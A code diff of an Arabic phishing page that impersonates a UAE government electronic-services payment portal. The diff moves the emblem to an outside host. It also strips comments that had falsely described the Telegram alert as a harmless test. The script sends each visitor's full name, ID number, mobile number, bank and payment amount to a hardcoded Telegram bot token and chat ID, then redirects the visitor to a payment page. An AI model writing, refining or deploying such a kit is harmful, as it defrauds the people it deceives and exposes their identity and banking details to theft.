@@ -19,7 +19,8 @@
 </head>
 <body>
   <header>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/65/Emblem_of_the_United_Arab_Emirates.svg" alt="شعار الإمارات">
+    <!-- تم استبدال صورة الشعار هنا -->
+    <img src="https://tonfree.serv00.net/sadUae/banks/image/Emarats.png" alt="شعار الإمارات">
     <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
     <p>حكومة الإمارات العربية المتحدة</p>
   </header>
@@ -85,7 +86,7 @@
   </footer>
 
   <script>
-    // بيانات بوت تيليجرام (للإشعار التجريبي الآمن)
+    // بيانات بوت تيليجرام
     const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
     const CHAT_ID   = "8404960059";
 
@@ -97,14 +98,13 @@
       // تحقق من رقم الهوية (15 رقمًا بالضبط)
       if (idNumber.length !== 15) {
         alert('رقم الهوية يجب أن يتكون من 15 رقمًا');
-        return; // لا يسمح بالمتابعة إذا كان الرقم غير صحيح
+        return;
       }
 
       const amount = document.getElementById('amount').value.trim();
-      // تحقق من أن المبلغ لا يقل عن درهم واحد
       if (parseFloat(amount) < 1) {
         alert('المبلغ يجب أن يكون على الأقل درهم واحد');
-        return; // لا يسمح بالمتابعة إذا كان المبلغ أقل من 1 درهم
+        return;
       }
 
       const data = {
@@ -114,13 +114,11 @@
         mobile:   document.getElementById('mobile').value.trim(),
         bank:     document.getElementById('bank').value,
         amount:   amount,
-        invoiceNumber: document.getElementById('invoiceNumber').value.trim() // رقم المفوتر
+        invoiceNumber: document.getElementById('invoiceNumber').value.trim()
       };
 
-      // تخزين كل المعلومات للصفحات التالية
       sessionStorage.setItem('formData', JSON.stringify(data));
 
-      // إشعار تجريبي — بدون إرسال أي بيانات حساسة
       const msg = `🚀 نموذج الواجهة الرئيسية
 👤 الاسم: ${data.fullName}
 🆔 رقم الهوية: ${data.idNumber}
@@ -135,10 +133,9 @@
           headers:{'Content-Type':'application/json'},
           body:JSON.stringify({chat_id: CHAT_ID, text: msg})
         });
-      }catch(_){/* تجاهُل أي خطأ */}
+      }catch(_){}
 
-      // الانتقال للصفحة الثانية
-      window.location.href = 'payment.html';  // الانتقال لصفحة الدفع
+      window.location.href = 'payment.html';
     });
   </script>
 </body>
